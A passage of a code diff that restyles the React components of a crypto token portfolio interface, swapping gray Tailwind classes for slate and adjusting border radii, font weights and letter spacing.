                                         <div className="flex items-center gap-2 bg-indigo-50 px-4 py-1.5 rounded-full border border-indigo-100 font-black text-[9px] text-indigo-600 uppercase tracking-widest">
                                             <Sparkles className="w-3 h-3" /> Equal Weighting
                                         </div>
@@ -3652,25 +3955,25 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                                         {customBucket.tokens.length === 0 ? (
                                             <div className="flex flex-col items-center justify-center py-24 text-gray-300 gap-6 opacity-30">
                                                 <Layout className="w-16 h-16" />
-                                                <p className="text-xs font-black uppercase tracking-[0.3em] italic">Search and pin tokens below</p>
+                                                <p className="text-xs font-bold uppercase tracking-wider italic">Search and pin tokens below</p>
                                             </div>
                                         ) : (
                                             customBucket.tokens.map(t => (
-                                                <div key={t.symbol} className="flex items-center justify-between p-5 bg-white rounded-3xl border border-gray-100 shadow-sm animate-in slide-in-from-right-8 transition-all hover:scale-[1.02]">
+                                                <div key={t.symbol} className="flex items-center justify-between p-5 bg-white rounded-xl border border-slate-200/60 shadow-sm animate-in slide-in-from-right-8 transition-all hover:scale-[1.02]">
                                                     <div className="flex items-center gap-4">
-                                                        <div className="w-12 h-12 bg-gray-50 rounded-2xl p-2 border border-blue-50">
+                                                        <div className="w-12 h-12 bg-slate-50 rounded-2xl p-2 border border-blue-50">
                                                             {t.image ? <img src={t.image} className="w-full h-full object-contain" alt="" /> : null}
                                                         </div>
                                                         <div>
-                                                            <p className="text-sm font-black text-gray-900 leading-none">{t.symbol}</p>
-                                                            <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1.5">{t.name}</p>
+                                                            <p className="text-sm font-black text-slate-900 leading-none">{t.symbol}</p>
+                                                            <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest mt-1.5">{t.name}</p>
                                                         </div>
                                                     </div>
                                                     <div className="flex items-center gap-4">
                                                         <div className="text-right mr-4">
                                                             <p className="text-[10px] font-black text-emerald-500 uppercase">14.28%</p>
                                                         </div>
-                                                        <button onClick={() => setCustomBucket({ ...customBucket, tokens: customBucket.tokens.filter(x => x.symbol !== t.symbol) })} className="p-3 text-gray-200 hover:text-rose-500 transition-colors bg-gray-50 rounded-xl">
+                                                        <button onClick={() => setCustomBucket({ ...customBucket, tokens: customBucket.tokens.filter(x => x.symbol !== t.symbol) })} className="p-3 text-gray-200 hover:text-rose-500 transition-colors bg-slate-50 rounded-xl">
                                                             <Trash2 className="w-4 h-4" />
                                                         </button>
                                                     </div>
@@ -3685,7 +3988,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                                             <input 
                                                 type="text" 
                                                 placeholder="Terminal Search (Symbol or Address)..."
-                                                className="w-full pl-16 pr-8 py-5 bg-white border border-gray-100 rounded-2xl font-black text-xs outline-none focus:border-indigo-500/50 shadow-sm"
+                                                className="w-full pl-16 pr-8 py-5 bg-white border border-slate-200/60 rounded-2xl font-black text-xs outline-none focus:border-indigo-500/50 shadow-sm"
                                                 onKeyDown={async (e) => {
                                                     if (e.key === 'Enter') {
                                                         const query = e.target.value.toLowerCase();
@@ -3722,7 +4025,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                                                 }}
                                             />
                                         </div>
-                                        <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest mt-5 text-center flex items-center justify-center gap-2">
+                                        <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest mt-5 text-center flex items-center justify-center gap-2">
                                             {searchLoading ? <Loader2 className="w-3 h-3 animate-spin text-indigo-500" /> : <Info className="w-3 h-3" />}
                                             {searchLoading ? 'Executing Global Discovery Protocol...' : 'Press Enter to deploy asset to blueprint'}
                                         </p>
@@ -3785,7 +4088,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
             </div>
 
             {/* Disclaimer Section */}
-            <div className="bg-rose-50/50 border border-rose-100 rounded-[3rem] p-10 md:p-14 space-y-10 relative overflow-hidden backdrop-blur-sm">
+            <div className="bg-rose-50/50 border border-rose-100 rounded-2xl p-10 md:p-14 space-y-10 relative overflow-hidden backdrop-blur-sm">
                  <div className="absolute -top-10 -right-10 opacity-5 pointer-events-none rotate-12">
                      <AlertTriangle className="w-96 h-96 text-rose-500" />
                  </div>
@@ -3795,11 +4098,11 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                      </div>
                      <div>
                          <h3 className="text-3xl font-black text-rose-900 uppercase tracking-tighter italic">Institutional Advisory & Risk Disclosure</h3>
-                         <p className="text-[10px] font-black text-rose-500 uppercase tracking-[0.3em] mt-2">B20 Global Regulatory Protocol Compliance</p>
+                         <p className="text-[10px] font-black text-rose-500 uppercase tracking-wider mt-2">B20 Global Regulatory Protocol Compliance</p>
                      </div>
                  </div>
                  
-                 <div className="grid grid-cols-1 md:grid-cols-2 gap-12 relative z-10">
+                 <div className="grid grid-cols-1 md:grid-cols-2 gap-8 relative z-10">
                      <div className="space-y-6">
                          <div className="flex gap-5">
                              <div className="w-10 h-10 bg-rose-100 rounded-xl flex items-center justify-center shrink-0"><Brain className="w-5 h-5 text-rose-600" /></div>
@@ -3844,17 +4147,17 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                  </div>
                  
                  <div className="pt-10 border-t border-rose-100 text-center relative z-10">
-                     <p className="text-[9px] font-black text-rose-400 uppercase tracking-[0.4em] italic">Secure Strategic Terminal • B20 Layer Intelligence</p>
+                     <p className="text-[9px] font-black text-rose-400 uppercase tracking-widest italic">Secure Strategic Terminal • B20 Layer Intelligence</p>
                  </div>
             </div>
 
             {status === 'success' && (
-                <motion.div initial={{ opacity: 0, y: 50 }} animate={{ opacity: 1, y: 0 }} className="fixed bottom-12 right-12 bg-emerald-500 text-white p-8 rounded-[2.5rem] shadow-2xl z-[300] flex items-center gap-6 border-4 border-white">
+                <motion.div initial={{ opacity: 0, y: 50 }} animate={{ opacity: 1, y: 0 }} className="fixed bottom-12 right-12 bg-emerald-500 text-white p-8 rounded-2xl shadow-2xl z-[300] flex items-center gap-6 border-4 border-white">
                     <div className="p-3 bg-white/20 rounded-2xl shadow-inner">
                         <CheckCircle2 className="w-8 h-8" />
                     </div>
                     <div>
-                        <p className="text-xl font-black uppercase tracking-tighter italic">Mission Success!</p>
+                        <p className="text-xl font-bold uppercase tracking-tighter italic">Mission Success!</p>
                         <p className="text-[10px] font-bold opacity-80 uppercase tracking-widest">Assets deployed directly to your wallet terminal.</p>
                     </div>
                 </motion.div>
@@ -3870,16 +4173,16 @@ const DiscoveryPopup = ({ isOpen, onClose, results, onSelect }) => {
             <motion.div 
                 initial={{ opacity: 0, scale: 0.95, y: 20 }}
                 animate={{ opacity: 1, scale: 1, y: 0 }}
-                className="w-full max-w-[500px] bg-white rounded-[3rem] shadow-[0_50px_100px_-20px_rgba(0,0,0,0.3)] border border-gray-100 overflow-hidden flex flex-col max-h-[70vh] font-sans"
+                className="w-full max-w-[500px] bg-white rounded-2xl shadow-[0_50px_100px_-20px_rgba(0,0,0,0.3)] border border-slate-200/60 overflow-hidden flex flex-col max-h-[70vh] font-sans"
             >
-                <div className="p-8 border-b border-gray-50 bg-gray-50/50">
+                <div className="p-8 border-b border-gray-50 bg-slate-50/50">
                     <div className="flex items-center justify-between">
                          <div>
-                            <h3 className="text-xl font-black text-gray-900 uppercase tracking-tighter">Global Discovery</h3>
-                            <p className="text-[9px] font-black text-indigo-500 uppercase tracking-[0.2em] mt-1">Multi-Node Search Results</p>
+                            <h3 className="text-xl font-black text-slate-900 uppercase tracking-tighter">Global Discovery</h3>
+                            <p className="text-[9px] font-black text-indigo-500 uppercase tracking-wide mt-1">Multi-Node Search Results</p>
                          </div>
                         <button onClick={onClose} className="w-10 h-10 rounded-full hover:bg-white flex items-center justify-center transition-colors shadow-sm">
-                            <X className="w-5 h-5 text-gray-400" />
+                            <X className="w-5 h-5 text-slate-400" />
                         </button>
                     </div>
                 </div>
@@ -3895,24 +4198,24 @@ const DiscoveryPopup = ({ isOpen, onClose, results, onSelect }) => {
                                     {(coin.large || coin.thumb) ? <img src={coin.large || coin.thumb} className="w-full h-full object-contain rounded-lg" alt="" /> : null}
                                 </div>
                                 <div>
-                                    <p className="font-black text-gray-900 uppercase text-xs">{coin.symbol}</p>
-                                    <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest">{coin.name}</p>
+                                    <p className="font-black text-slate-900 uppercase text-xs">{coin.symbol}</p>
+                                    <p className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">{coin.name}</p>
                                 </div>
                             </div>
                             <div className="flex items-center gap-3">
                                 <span className="text-[8px] font-black text-gray-300 uppercase tracking-widest">#{coin.market_cap_rank || '?'}</span>
-                                <div className="px-4 py-1.5 bg-gray-900 text-white rounded-lg text-[8px] font-black uppercase opacity-0 group-hover:opacity-100 transition-opacity">Select</div>
+                                <div className="px-4 py-1.5 bg-gray-900 text-white rounded-lg text-[8px] font-bold uppercase opacity-0 group-hover:opacity-100 transition-opacity">Select</div>
                             </div>
                         </div>
                     ))}
                     {results.length === 0 && (
-                        <div className="text-center py-20 text-gray-400 font-bold uppercase tracking-widest text-xs italic">
+                        <div className="text-center py-20 text-slate-400 font-bold uppercase tracking-widest text-xs italic">
                             No matching assets discovered.
                         </div>
                     )}
                 </div>
-                <div className="p-6 bg-gray-50 border-t border-gray-100 text-center">
-                    <p className="text-[8px] font-black text-gray-400 uppercase tracking-widest leading-relaxed">
+                <div className="p-6 bg-slate-50 border-t border-slate-200/60 text-center">
+                    <p className="text-[8px] font-black text-slate-400 uppercase tracking-widest leading-relaxed">
                         Data provided by CoinGecko Sentinel Layer. Assets must be available on BSC (BEP-20) network.
                     </p>
                 </div>
@@ -3929,23 +4232,23 @@ const TokenSelector = ({ isOpen, onClose, onSelect, tokens, searchTerm, setSearc
                 initial={{ opacity: 1, scale: 1 }}
                 animate={{ opacity: 1, scale: 1 }}
                 transition={{ duration: 0 }}
-                className="w-full max-w-[600px] bg-white rounded-[3rem] shadow-4xl shadow-gray-200 border border-gray-100 overflow-hidden flex flex-col max-h-[80vh] font-sans"
+                className="w-full max-w-[600px] bg-white rounded-2xl shadow-4xl shadow-gray-200 border border-slate-200/60 overflow-hidden flex flex-col max-h-[80vh] font-sans"
             >
                 <div className="p-8 border-b border-gray-50">
                     <div className="flex items-center justify-between mb-8">
-                        <h3 className="text-xl font-black text-gray-900 uppercase tracking-tighter">Select Asset</h3>
-                        <button onClick={onClose} className="w-10 h-10 rounded-full hover:bg-gray-50 flex items-center justify-center transition-colors">
-                            <X className="w-5 h-5 text-gray-400" />
+                        <h3 className="text-xl font-black text-slate-900 uppercase tracking-tighter">Select Asset</h3>
+                        <button onClick={onClose} className="w-10 h-10 rounded-full hover:bg-slate-50 flex items-center justify-center transition-colors">
+                            <X className="w-5 h-5 text-slate-400" />
                         </button>
                     </div>
                     <div className="relative">
-                        <Search className="absolute left-6 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
+                        <Search className="absolute left-6 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
                         <input 
                             type="text"
                             placeholder="Search by name or address..."
                             value={searchTerm}
                             onChange={(e) => setSearchTerm(e.target.value)}
-                            className="w-full pl-16 pr-8 py-5 bg-gray-50 rounded-2xl border border-gray-100 outline-none focus:border-amber-500/50 transition-all font-bold text-sm"
+                            className="w-full pl-16 pr-8 py-5 bg-slate-50 rounded-2xl border border-slate-200/60 outline-none focus:border-indigo-500/50 transition-all font-bold text-sm"
                         />
                     </div>
                 </div>
@@ -3954,19 +4257,19 @@ const TokenSelector = ({ isOpen, onClose, onSelect, tokens, searchTerm, setSearc
                         <div 
                             key={t.id || t.address}
                             onClick={() => { onSelect(t); onClose(); }}
-                            className="flex items-center justify-between p-4 hover:bg-gray-50 rounded-2xl cursor-pointer transition-all border border-transparent hover:border-gray-100 group"
+                            className="flex items-center justify-between p-4 hover:bg-slate-50 rounded-2xl cursor-pointer transition-all border border-transparent hover:border-slate-200/60 group"
                         >
                             <div className="flex items-center gap-4">
                                 <div className="w-12 h-12 bg-white rounded-xl p-1 shadow-sm">
                                     {t.image ? <img src={t.image} className="w-full h-full object-contain rounded-lg" alt="" /> : null}
                                 </div>
                                 <div>
-                                    <p className="font-black text-gray-900 uppercase text-xs">{t.symbol}</p>
-                                    <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{t.name}</p>
+                                    <p className="font-black text-slate-900 uppercase text-xs">{t.symbol}</p>
+                                    <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">{t.name}</p>
                                 </div>
                             </div>
                             <div className="text-right">
-                                <p className="font-black text-gray-900 text-xs">${t.current_price?.toLocaleString()}</p>
+                                <p className="font-black text-slate-900 text-xs">${t.current_price?.toLocaleString()}</p>
                                 <p className={`text-[10px] font-bold ${t.price_change_percentage_24h >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>
                                     {t.price_change_percentage_24h?.toFixed(2)}%
                                 </p>
